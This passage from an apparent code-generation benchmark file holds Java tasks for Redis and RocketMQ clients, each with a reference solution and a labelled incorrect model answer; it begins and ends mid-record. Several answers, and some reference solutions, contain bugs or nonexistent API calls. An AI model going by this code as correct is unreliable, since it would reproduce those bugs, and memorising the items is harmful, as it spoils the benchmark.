    "wrong_result": "```java\nimport redis.clients.jedis.*;\nimport redis.clients.util.Pool;\nimport java.util.List;\nimport java.util.Set;\n\npublic class RedisConnectionFactory {\n    private String hostName = \"localhost\";\n    private int port = 6379;\n    private int timeout = 2000;\n    private String password;\n    private String sentinelMaster;\n    private List<RedisNode> redisServers;\n    private boolean isCluster;\n    private int dbIndex = 0;\n    private JedisShardInfo shardInfo;\n    private Pool<Jedis> pool;\n    private JedisCluster cluster;\n    private JedisPoolConfig poolConfig;\n\n    public RedisConnectionFactory() {\n        poolConfig = new JedisPoolConfig();\n    }\n\n    public void init() {\n        if (isCluster) {\n            cluster = createCluster();\n        } else {\n            pool = createPool();\n        }\n    }\n\n    public void destroy() {\n        if (pool != null) {\n            pool.destroy();\n        }\n        if (cluster != null) {\n            cluster.close();\n        }\n    }\n\n    protected Jedis fetchJedisConnector() {\n        if (isCluster) {\n            return cluster.getConnection();\n        } else {\n            return getJedisConnection();\n        }\n    }\n\n    protected Pool<Jedis> createPool() {\n        if (redisServers != null && !redisServers.isEmpty()) {\n            return createRedisSentinelPool();\n        } else {\n            return createRedisPool();\n        }\n    }\n\n    protected JedisPool createRedisPool() {\n        if (shardInfo == null) {\n            shardInfo = new JedisShardInfo(hostName, port, timeout);\n            if (password != null && !password.isEmpty()) {\n                shardInfo.setPassword(password);\n            }\n        }\n        return new JedisPool(poolConfig, hostName, port, timeout, password);\n    }\n\n    protected JedisPool createRedisSentinelPool() {\n        Set<String> sentinels = null;\n        for (RedisNode node : redisServers) {\n            if (sentinels == null) {\n                sentinels = new java.util.HashSet<>();\n            }\n            sentinels.add(node.getHost() + \":\" + node.getPort());\n        }\n        return new JedisSentinelPool(sentinelMaster, sentinels, poolConfig, timeout, password);\n    }\n\n    protected JedisCluster createCluster() {\n        java.util.Set<HostAndPort> nodes = new java.util.HashSet<>();\n        for (RedisNode node : redisServers) {\n            nodes.add(new HostAndPort(node.getHost(), node.getPort()));\n        }\n        return new JedisCluster(nodes, timeout, timeout, 5, password, poolConfig);\n    }\n\n    public Jedis getJedisConnection() {\n        Jedis jedis = pool.getResource();\n        if (dbIndex >= 0) {\n            jedis.select(dbIndex);\n        }\n        return jedis;\n    }\n\n    public JedisCluster getClusterConnection() {\n        return cluster;\n    }\n}\n```"
  },
  {
    "Task_id": 345,
    "Instruction": "Task Description: Implement a Redis sharding client in Java that distributes keys across multiple Redis instances using consistent hashing, with support for basic CRUD operations and command execution.\n\nClass Description: JedisSharding is a Redis client wrapper that implements sharding across multiple Redis instances. It uses consistent hashing to distribute keys and automatically manages connections to the appropriate shard for each operation.\n\nAttributes:\n- shards: List<HostAndPort> - List of Redis server addresses and ports for sharding\n- clientConfig: JedisClientConfig - Configuration for Redis client connections\n- hashing: Hashing - Hashing algorithm used for key distribution (defaults to MURMUR_HASH)\n\nMethods:\n- JedisSharding(List<HostAndPort>, JedisClientConfig) -> void - Constructor with default hashing algorithm\n- JedisSharding(List<HostAndPort>, JedisClientConfig, Hashing) -> void - Constructor with custom hashing algorithm\n- set(String, String) -> String - Stores a key-value pair in the appropriate shard\n- get(String) -> String - Retrieves a value from the appropriate shard\n- sendCommand(String, Protocol.Command, String...) -> Object - Sends a raw Redis command to the appropriate shard\n- close() -> void - Cleans up resources (no-op as connections are managed per-operation)\n- getShard(String) -> Jedis - Internal method to get a connection to the correct shard\n- getShardIndex(String) -> int - Internal method to calculate shard index for a key",
    "Canonical_solution": "import redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.util.Hashing;\nimport java.util.List;\n\npublic class JedisSharding implements AutoCloseable {\n\n    private final List<HostAndPort> shards;\n    private final JedisClientConfig clientConfig;\n    private final Hashing hashing;\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig) {\n        this(shards, clientConfig, Hashing.MURMUR_HASH);\n    }\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig, Hashing hashing) {\n        this.shards = shards;\n        this.clientConfig = clientConfig;\n        this.hashing = hashing;\n    }\n\n    public String set(String key, String value) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.set(key, value);\n        }\n    }\n\n    public String get(String key) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.get(key);\n        }\n    }\n\n    public Object sendCommand(String key, Protocol.Command command, String... args) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.sendCommand(command, args);\n        }\n    }\n\n    private Jedis getShard(String key) {\n        int shardIndex = getShardIndex(key);\n        HostAndPort shard = shards.get(shardIndex);\n        Jedis jedis = new Jedis(shard, clientConfig);\n        if (shard.getPassword() != null) {\n            jedis.auth(shard.getPassword());\n        }\n        return jedis;\n    }\n\n    private int getShardIndex(String key) {\n        long hash = hashing.hash(key);\n        return (int) (hash % shards.size());\n    }\n\n    @Override\n    public void close() {\n        // Connection cleanup handled by try-with-resources in individual operations\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.HostAndPort;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.Protocol;\nimport redis.clients.util.Hashing;\n\nimport java.util.List;\nimport java.util.NoSuchElementException;\n\npublic class JedisSharding {\n    private final List<HostAndPort> shards;\n    private final JedisClientConfig clientConfig;\n    private final Hashing hashing;\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig) {\n        this(shards, clientConfig, Hashing.MURMUR_HASH);\n    }\n\n    public JedisSharding(List<HostAndPort> shards, JedisClientConfig clientConfig, Hashing hashing) {\n        this.shards = shards;\n        this.clientConfig = clientConfig;\n        this.hashing = hashing;\n    }\n\n    public String set(String key, String value) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.set(key, value);\n        }\n    }\n\n    public String get(String key) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.get(key);\n        }\n    }\n\n    public Object sendCommand(String key, Protocol.Command command, String... args) {\n        try (Jedis jedis = getShard(key)) {\n            return jedis.sendCommand(command, args);\n        }\n    }\n\n    public void close() {\n        // No-op: connections are managed per-operation\n    }\n\n    protected Jedis getShard(String key) {\n        int index = getShardIndex(key);\n        HostAndPort shard = shards.get(index);\n        return new Jedis(shard.getHost(), shard.getPort(), clientConfig);\n    }\n\n    protected int getShardIndex(String key) {\n        int hash = hashing.hash(key);\n        return Math.abs(hash % shards.size());\n    }\n}\n```"
  },
  {
    "Task_id": 349,
    "Instruction": "Task Description: Create a Java class that implements Redis cluster operations using JedisCluster for caching management, including basic CRUD operations, hash operations, and batch operations.\n\nClass Description: JedisClusterCacheManager is a Redis cache manager implementation that uses JedisCluster to interact with a Redis cluster. It provides various Redis operations including setting/getting values, hash operations, batch operations, and deletion. The class handles serialization/deserialization of objects and manages Redis connections.\n\nAttributes:\n- redis: JedisClusterClient - The Redis client wrapper that implements IRedis interface\n- log: Logger - Logger instance for error logging\n- serializer: ISerializer<Object> - Serializer for converting objects to/from byte arrays (inherited from AbstractRedisCacheManager)\n\nMethods:\n- JedisClusterCacheManager(JedisCluster, ISerializer<Object>) -> void - Constructor that initializes the Redis client and serializer\n- getRedis() -> IRedis - Returns the Redis client instance\n- close() -> void - Closes the Redis connection (inherited from AbstractRedisCacheManager)\n- set(byte[], byte[]) -> void - Sets a key-value pair in Redis\n- setex(byte[], int, byte[]) -> void - Sets a key-value pair with expiration time\n- hset(byte[], byte[], byte[]) -> void - Sets a field in a Redis hash\n- hset(byte[], byte[], byte[], int) -> void - Sets a field in a Redis hash with expiration time for the key\n- mset(Collection<MSetParam>) -> void - Batch sets multiple key-value pairs\n- get(byte[]) -> byte[] - Gets a value by key\n- hget(byte[], byte[]) -> byte[] - Gets a field value from a Redis hash\n- mget(Type, Set<CacheKeyTO>) -> Map<CacheKeyTO, CacheWrapper<Object>> - Batch gets multiple values\n- delete(Set<CacheKeyTO>) -> void - Deletes multiple keys",
    "Canonical_solution": "import com.jarvis.cache.MSetParam;\nimport com.jarvis.cache.serializer.ISerializer;\nimport com.jarvis.cache.to.CacheKeyTO;\nimport com.jarvis.cache.to.CacheWrapper;\nimport redis.clients.jedis.JedisCluster;\nimport java.io.IOException;\nimport java.lang.reflect.Type;\nimport java.util.Collection;\nimport java.util.Map;\nimport java.util.Set;\n\npublic class JedisClusterCacheManager extends AbstractRedisCacheManager {\n\n    private static final Logger log = LoggerFactory.getLogger(JedisClusterCacheManager.class);\n    \n    private final JedisClusterClient redis;\n\n    public JedisClusterCacheManager(JedisCluster jedisCluster, ISerializer<Object> serializer) {\n        super(serializer);\n        this.redis = new JedisClusterClient(jedisCluster, this);\n    }\n\n    @Override\n    protected IRedis getRedis() {\n        return redis;\n    }\n\n    public static class JedisClusterClient implements IRedis {\n\n        private final JedisCluster jedisCluster;\n        private final AbstractRedisCacheManager cacheManager;\n\n        public JedisClusterClient(JedisCluster jedisCluster, AbstractRedisCacheManager cacheManager) {\n            this.jedisCluster = jedisCluster;\n            this.cacheManager = cacheManager;\n        }\n\n        @Override\n        public void close() throws IOException {\n        }\n\n        @Override\n        public void set(byte[] key, byte[] value) {\n            jedisCluster.set(key, value);\n        }\n\n        @Override\n        public void setex(byte[] key, int seconds, byte[] value) {\n            jedisCluster.setex(key, seconds, value);\n        }\n\n        @Override\n        public void hset(byte[] key, byte[] field, byte[] value) {\n            jedisCluster.hset(key, field, value);\n        }\n\n        @Override\n        public void hset(byte[] key, byte[] field, byte[] value, int seconds) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    pipeline.hset(key, field, value);\n                    pipeline.expire(key, seconds);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n\n        @Override\n        public void mset(Collection<MSetParam> params) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) throws Exception {\n                    JedisUtil.executeMSet(pipeline, cacheManager, params);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n\n        @Override\n        public byte[] get(byte[] key) {\n            return jedisCluster.get(key);\n        }\n\n        @Override\n        public byte[] hget(byte[] key, byte[] field) {\n            return jedisCluster.hget(key, field);\n        }\n\n        @Override\n        public Map<CacheKeyTO, CacheWrapper<Object>> mget(Type returnType, Set<CacheKeyTO> keys) throws Exception {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    JedisUtil.executeMGet(pipeline, keys);\n                }\n            };\n            return cacheManager.deserialize(keys, retryableJedisClusterPipeline.syncAndReturnAll(), returnType);\n        }\n\n        @Override\n        public void delete(Set<CacheKeyTO> keys) {\n            RetryableJedisClusterPipeline retryableJedisClusterPipeline = new RetryableJedisClusterPipeline(jedisCluster) {\n                @Override\n                public void execute(JedisClusterPipeline pipeline) {\n                    JedisUtil.executeDelete(pipeline, keys);\n                }\n            };\n            try {\n                retryableJedisClusterPipeline.sync();\n            } catch (Exception e) {\n                log.error(e.getMessage(), e);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\npublic class JedisClusterCacheManager extends AbstractRedisCacheManager {\n\n    private final JedisCluster redis;\n\n    public JedisClusterCacheManager(JedisCluster redis, ISerializer<Object> serializer) {\n        super(serializer);\n        this.redis = redis;\n    }\n\n    @Override\n    public IRedis getRedis() {\n        return redis;\n    }\n\n    @Override\n    public void close() {\n        if (redis != null) {\n            redis.close();\n        }\n    }\n\n    @Override\n    public void set(byte[] key, byte[] value) {\n        try {\n            redis.set(key, value);\n        } catch (Exception e) {\n            log.error(\"Error setting key: \" + new String(key), e);\n        }\n    }\n\n    @Override\n    public void setex(byte[] key, int expireSeconds, byte[] value) {\n        try {\n            redis.setex(key, expireSeconds, value);\n        } catch (Exception e) {\n            log.error(\"Error setting with expiration for key: \" + new String(key), e);\n        }\n    }\n\n    @Override\n    public void hset(byte[] key, byte[] field, byte[] value) {\n        try {\n            redis.hset(key, field, value);\n        } catch (Exception e) {\n            log.error(\"Error setting hash field for key: \" + new String(key), e);\n        }\n    }\n\n    @Override\n    public void hset(byte[] key, byte[] field, byte[] value, int expireSeconds) {\n        try {\n            redis.hset(key, field, value);\n            redis.expire(key, expireSeconds);\n        } catch (Exception e) {\n            log.error(\"Error setting hash field with TTL for key: \" + new String(key), e);\n        }\n    }\n\n    @Override\n    public void mset(Collection<MSetParam> params) {\n        try {\n            Map<byte[], byte[]> map = new HashMap<>();\n            for (MSetParam param : params) {\n                map.put(param.getKey(), param.getValue());\n            }\n            redis.mset(map);\n        } catch (Exception e) {\n            log.error(\"Error performing batch set operation\", e);\n        }\n    }\n\n    @Override\n    public byte[] get(byte[] key) {\n        try {\n            return redis.get(key);\n        } catch (Exception e) {\n            log.error(\"Error getting value for key: \" + new String(key), e);\n            return null;\n        }\n    }\n\n    @Override\n    public byte[] hget(byte[] key, byte[] field) {\n        try {\n            return redis.hget(key, field);\n        } catch (Exception e) {\n            log.error(\"Error getting hash field for key: \" + new String(key), e);\n            return null;\n        }\n    }\n\n    @Override\n    public <T> Map<CacheKeyTO, CacheWrapper<Object>> mget(Class<T> type, Set<CacheKeyTO> keys) {\n        Map<CacheKeyTO, CacheWrapper<Object>> result = new HashMap<>();\n        for (CacheKeyTO key : keys) {\n            byte[] bytes = get(key.getKeyBytes());\n            if (bytes != null) {\n                Object obj = serializer.deserialize(bytes);\n                result.put(key, new CacheWrapper<>(obj));\n            }\n        }\n        return result;\n    }\n\n    @Override\n    public void delete(Set<CacheKeyTO> keys) {\n        try {\n            for (CacheKeyTO key : keys) {\n                redis.del(key.getKeyBytes());\n            }\n        } catch (Exception e) {\n            log.error(\"Error deleting keys\", e);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 352,
    "Instruction": "Task Description: Implement a distributed lock mechanism using Redis in Java to ensure thread-safe operations across multiple processes or systems.\n\nClass Description: RedisDistributeLock is a class that provides distributed locking functionality using Redis as the backend storage. It manages lock acquisition, release, and timeout handling to coordinate access to shared resources in a distributed environment.\n\nAttributes:\n- pool: [JedisPool] - The connection pool for Redis connections\n- jedisLock: [JedisLock] - The lock implementation instance\n- lockKey: [String] - The key used for locking in Redis\n- jedis: [Jedis] - The Redis client instance\n- timeoutMsecs: [int] - Maximum time to wait for lock acquisition in milliseconds\n- expireMsecs: [int] - Time after which the lock automatically expires in milliseconds\n\nMethods:\n- RedisDistributeLock([String] lockKey) -> [void] - Constructor with default timeout (3000ms) and expire (300000ms) values\n- RedisDistributeLock([String] lockKey, [int] timeoutMsecs, [int] expireMsecs) -> [void] - Constructor with custom timeout and expire values\n- wrap([Runnable] runnable) -> [void] - Executes the given runnable within the acquired lock context\n- lockRelease([JedisLock] lock, [Jedis] jedis) -> [void] - Releases the lock and closes the Redis connection\n- getPool() -> [JedisPool] - Static getter for the Redis connection pool\n- setPool([JedisPool] pool) -> [void] - Static setter for the Redis connection pool",
    "Canonical_solution": "import com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\n\npublic class RedisDistributeLock {\n\n    private static Logger LOGGER = LoggerFactory.getLogger(RedisDistributeLock.class);\n\n    private static JedisPool pool;\n    private JedisLock jedisLock;\n    private String lockKey;\n    private Jedis jedis;\n    private int timeoutMsecs;\n    private int expireMsecs;\n\n    public RedisDistributeLock(String lockKey) {\n        this(lockKey, 3000, 300000);\n    }\n\n    public RedisDistributeLock(String lockKey, int timeoutMsecs, int expireMsecs) {\n        this.lockKey = lockKey;\n        this.jedis = pool.getResource();\n        this.timeoutMsecs = timeoutMsecs;\n        this.expireMsecs = expireMsecs;\n        this.jedisLock = new JedisLock(jedis, lockKey.intern(), timeoutMsecs, expireMsecs);\n    }\n\n    public void wrap(Runnable runnable) {\n        long begin = System.currentTimeMillis();\n        try {\n            LOGGER.info(\"begin logck,lockKey={},timeoutMsecs={},expireMsecs={}\", lockKey, timeoutMsecs, expireMsecs);\n            if (jedisLock.acquire()) {\n                runnable.run();\n            } else {\n                LOGGER.info(\"The time wait for lock more than [{}] ms \", timeoutMsecs);\n            }\n        } catch (Throwable t) {\n            LOGGER.warn(t.getMessage(), t);\n        } finally {\n            this.lockRelease(jedisLock, jedis);\n        }\n        LOGGER.info(\"[{}]cost={}\", lockKey, System.currentTimeMillis() - begin);\n    }\n\n    private void lockRelease(JedisLock lock, Jedis jedis) {\n        if (lock != null) {\n            try {\n                lock.release();\n            } catch (Exception e) {\n            }\n        }\n        if (jedis != null) {\n            jedis.close();\n        }\n        LOGGER.info(\"release logck,lockKey={},timeoutMsecs={},expireMsecs={}\", lockKey, timeoutMsecs, expireMsecs);\n    }\n\n    public static JedisPool getPool() {\n        return pool;\n    }\n\n    public static synchronized void setPool(JedisPool pool) {\n        RedisDistributeLock.pool = pool;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "wrong_result": "```java\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.params.SetParams;\n\npublic class RedisDistributeLock {\n    private static JedisPool pool;\n    private final String lockKey;\n    private int timeoutMsecs = 3000;\n    private int expireMsecs = 300000;\n\n    public RedisDistributeLock(String lockKey) {\n        this.lockKey = lockKey;\n    }\n\n    public RedisDistributeLock(String lockKey, int timeoutMsecs, int expireMsecs) {\n        this.lockKey = lockKey;\n        this.timeoutMsecs = timeoutMsecs;\n        this.expireMsecs = expireMsecs;\n    }\n\n    public void wrap(Runnable runnable) {\n        Jedis jedis = null;\n        try {\n            jedis = getPool().getResource();\n            long end = System.currentTimeMillis() + timeoutMsecs;\n            while (System.currentTimeMillis() < end) {\n                String result = jedis.set(lockKey, \"locked\", SetParams.setParams().nx().ex(expireMsecs / 1000));\n                if (\"OK\".equals(result)) {\n                    try {\n                        runnable.run();\n                    } finally {\n                        lockRelease(null, jedis);\n                    }\n                    return;\n                }\n                Thread.sleep(100);\n            }\n            throw new RuntimeException(\"Failed to acquire lock within timeout\");\n        } catch (Exception e) {\n            throw new RuntimeException(e);\n        } finally {\n            if (jedis != null) {\n                jedis.close();\n            }\n        }\n    }\n\n    public void lockRelease(JedisLock lock, Jedis jedis) {\n        if (jedis != null && jedis.isConnected()) {\n            jedis.del(lockKey);\n            jedis.close();\n        }\n    }\n\n    public static JedisPool getPool() {\n        return pool;\n    }\n\n    public static void setPool(JedisPool pool) {\n        RedisDistributeLock.pool = pool;\n    }\n}\n```"
  },
  {
    "Task_id": 364,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer capable of subscribing to topics, filtering messages, and processing them asynchronously.\n\nClass Description: The RocketMQConsumer class provides a wrapper around RocketMQ's DefaultMQPushConsumer to simplify consumer setup and message handling. It supports both tag-based and SQL92 filtering, configurable threading, and various RocketMQ features like message tracing and ACL.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The underlying RocketMQ push consumer instance\n- topic: String - The topic to subscribe to\n- group: String - The consumer group name\n- threadCount: int - Number of threads for message processing\n- filterType: String - Type of message filtering (TAG or SQL92)\n- expression: String - Filter expression (either tag or SQL condition)\n- msgTraceEnable: boolean - Whether to enable message tracing\n- aclEnable: boolean - Whether to enable access control\n- clientRebalanceEnable: boolean - Whether to enable client-side rebalancing\n- rpcHook: RPCHook - Custom RPC hook for authentication\n\nMethods:\n- initialize(): void - Initializes the consumer with configured settings and subscribes to the topic\n- setMessageListener(MessageListenerConcurrently listener): void - Registers a message listener for concurrent message processing\n- start(): void - Starts the consumer to begin receiving messages\n- shutdown(): void - Gracefully shuts down the consumer\n- setNamesrvAddr(String namesrvAddr): void - Sets the NameServer address for broker discovery",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageSelector;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.consumer.rebalance.AllocateMessageQueueAveragely;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.MixAll;\nimport org.apache.rocketmq.common.filter.ExpressionType;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.remoting.RPCHook;\n\npublic class RocketMQConsumer {\n\n    private DefaultMQPushConsumer consumer;\n    private String topic;\n    private String group;\n    private int threadCount;\n    private String filterType;\n    private String expression;\n    private boolean msgTraceEnable;\n    private boolean aclEnable;\n    private boolean clientRebalanceEnable;\n    private RPCHook rpcHook;\n\n    public RocketMQConsumer(String topic, String group, int threadCount, String filterType, \n                          String expression, boolean msgTraceEnable, boolean aclEnable, \n                          boolean clientRebalanceEnable, RPCHook rpcHook) {\n        this.topic = topic;\n        this.group = group;\n        this.threadCount = threadCount;\n        this.filterType = filterType;\n        this.expression = expression;\n        this.msgTraceEnable = msgTraceEnable;\n        this.aclEnable = aclEnable;\n        this.clientRebalanceEnable = clientRebalanceEnable;\n        this.rpcHook = rpcHook;\n    }\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(group, rpcHook, new AllocateMessageQueueAveragely(), msgTraceEnable, null);\n        consumer.setConsumeThreadMin(threadCount);\n        consumer.setConsumeThreadMax(threadCount);\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.setClientRebalance(clientRebalanceEnable);\n\n        if (filterType == null || expression == null) {\n            consumer.subscribe(topic, \"*\");\n        } else {\n            if (ExpressionType.TAG.equals(filterType)) {\n                String expr = MixAll.file2String(expression);\n                consumer.subscribe(topic, MessageSelector.byTag(expr));\n            } else if (ExpressionType.SQL92.equals(filterType)) {\n                String expr = MixAll.file2String(expression);\n                consumer.subscribe(topic, MessageSelector.bySql(expr));\n            } else {\n                throw new IllegalArgumentException(\"Not support filter type! \" + filterType);\n            }\n        }\n    }\n\n    public void setMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.MessageSelector;\nimport org.apache.rocketmq.client.consumer.rebalance.AllocateMessageQueueAveragely;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.client.impl.consumer.DefaultMQPushConsumerImpl;\n\npublic class RocketMQConsumer {\n    private DefaultMQPushConsumer consumer;\n    private String topic;\n    private String group;\n    private int threadCount = 1;\n    private String filterType;\n    private String expression;\n    private boolean msgTraceEnable = false;\n    private boolean aclEnable = false;\n    private boolean clientRebalanceEnable = true;\n    private RPCHook rpcHook;\n\n    public RocketMQConsumer(String topic, String group) {\n        this.topic = topic;\n        this.group = group;\n        consumer = new DefaultMQPushConsumer(group);\n    }\n\n    public void initialize() {\n        if (aclEnable && rpcHook != null) {\n            consumer.setRPCHook(rpcHook);\n        }\n\n        if (msgTraceEnable) {\n            consumer.enableMsgTrace(true, null, \"rocketmq-spring\");\n        }\n\n        if (!clientRebalanceEnable) {\n            consumer.setRebalanceMode(ClientConfig.RebalanceMode.MANUAL);\n        }\n\n        try {\n            if (\"TAG\".equalsIgnoreCase(filterType)) {\n                consumer.subscribe(topic, expression);\n            } else if (\"SQL92\".equalsIgnoreCase(filterType)) {\n                consumer.subscribe(topic, MessageSelector.bySql(expression));\n            } else {\n                consumer.subscribe(topic, \"*\");\n            }\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to subscribe to topic: \" + topic, e);\n        }\n\n        consumer.setConsumeThreadMin(threadCount);\n        consumer.setConsumeThreadMax(threadCount);\n        consumer.setPullThresholdForQueue(1000);\n        consumer.setPullBatchSize(32);\n        consumer.setAllocateMessageQueueStrategy(new AllocateMessageQueueAveragely());\n    }\n\n    public void setMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() {\n        try {\n            consumer.start();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to start RocketMQ consumer\", e);\n        }\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void setFilterType(String filterType) {\n        this.filterType = filterType;\n    }\n\n    public void setExpression(String expression) {\n        this.expression = expression;\n    }\n\n    public void setMsgTraceEnable(boolean msgTraceEnable) {\n        this.msgTraceEnable = msgTraceEnable;\n    }\n\n    public void setAclEnable(boolean aclEnable) {\n        this.aclEnable = aclEnable;\n    }\n\n    public void setClientRebalanceEnable(boolean clientRebalanceEnable) {\n        this.clientRebalanceEnable = clientRebalanceEnable;\n    }\n\n    public void setRpcHook(RPCHook rpcHook) {\n        this.rpcHook = rpcHook;\n    }\n\n    public void setThreadCount(int threadCount) {\n        this.threadCount = threadCount;\n    }\n}\n```"
  },
  {
    "Task_id": 366,
    "Instruction": "Task Description: Implement a RocketMQ consumer class in Java that can subscribe to a topic, consume messages asynchronously, and handle message consumption with configurable retry behavior.\n\nClass Description: The RocketMQConsumer class is responsible for consuming messages from a RocketMQ broker. It provides functionality to initialize the consumer, start message consumption with configurable retry behavior, and shutdown the consumer gracefully.\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance\n- consumerGroup: String - The consumer group name\n- topic: String - The topic to subscribe to\n- subscription: String - The subscription expression (tags filter)\n- returnFailedHalf: boolean - Flag to control whether to return failure status for half of the messages\n\nMethods:\n- initialize() throws MQClientException -> void - Initializes the consumer instance with the specified group name and subscription\n- start() throws MQClientException -> void - Starts the consumer with a message listener that handles incoming messages and implements the retry logic\n- shutdown() -> void - Shuts down the consumer instance gracefully",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class RocketMQConsumer {\n\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subscription;\n    private boolean returnFailedHalf;\n\n    public RocketMQConsumer(String consumerGroup, String topic, String subscription, boolean returnFailedHalf) {\n        this.consumerGroup = consumerGroup;\n        this.topic = topic;\n        this.subscription = subscription;\n        this.returnFailedHalf = returnFailedHalf;\n    }\n\n    public void initialize() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.subscribe(topic, subscription != null ? subscription : \"*\");\n    }\n\n    public void start() throws MQClientException {\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            AtomicLong consumeTimes = new AtomicLong(0);\n\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                ConsumeConcurrentlyContext context) {\n                long currentTimes = this.consumeTimes.incrementAndGet();\n                System.out.printf(\"%-8d %s%n\", currentTimes, msgs);\n                if (returnFailedHalf) {\n                    if ((currentTimes % 2) == 0) {\n                        return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                    }\n                }\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n\n        consumer.start();\n        System.out.printf(\"Consumer Started.%n\");\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "```java\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.*;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RocketMQConsumer {\n    private DefaultMQPushConsumer consumer;\n    private String consumerGroup;\n    private String topic;\n    private String subscription;\n    private boolean returnFailedHalf;\n\n    public RocketMQConsumer(String consumerGroup, String topic, String subscription, boolean returnFailedHalf) {\n        this.consumerGroup = consumerGroup;\n        this.topic = topic;\n        this.subscription = subscription;\n        this.returnFailedHalf = returnFailedHalf;\n    }\n\n    public void initialize() throws Exception {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.subscribe(topic, subscription);\n    }\n\n    public void start() throws Exception {\n        consumer.registerMessageListener((MessageListenerConcurrently) (msgs, context) -> {\n            AtomicInteger retryCount = new AtomicInteger(0);\n            for (MessageExt msg : msgs) {\n                try {\n                    consumeMessage(msg);\n                } catch (Exception e) {\n                    if (returnFailedHalf && retryCount.incrementAndGet() < 3) {\n                        continue;\n                    }\n                    return ConsumeConcurrentlyStatus.RECONSUME_LATER;\n                }\n            }\n            return 